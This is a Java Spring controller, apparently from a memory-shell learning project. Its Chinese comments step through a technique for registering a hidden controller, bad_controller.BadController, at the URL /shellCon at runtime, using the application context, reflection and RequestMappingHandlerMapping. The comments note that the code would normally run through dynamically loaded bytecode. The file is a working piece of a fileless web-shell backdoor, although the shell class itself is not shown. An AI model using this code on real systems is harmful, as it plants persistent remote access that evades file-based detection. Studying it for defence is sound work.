package controller;

import Tools.WaysToFindContext;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import java.lang.reflect.Method;

//这些实际上应该在动态加载字节码的时候执行，但是这里为了方便，直接写一个Controller了
@Controller
public class AddBadController {
    @RequestMapping("/addBadController")
    public String addBadController() throws ClassNotFoundException, InstantiationException, IllegalAccessException {
        WebApplicationContext context = WaysToFindContext.way01();
        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
        // 2. 通过反射获得自定义 controller 中唯一的 Method 对象
        Method declaredMethod = Class.forName("bad_controller.BadController").getDeclaredMethods()[0];
        // 3. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition("/shellCon");
        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 5. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        r.registerMapping(info, Class.forName("bad_controller.BadController").newInstance(), declaredMethod);
        return "/shellCon has been added";
    }
}
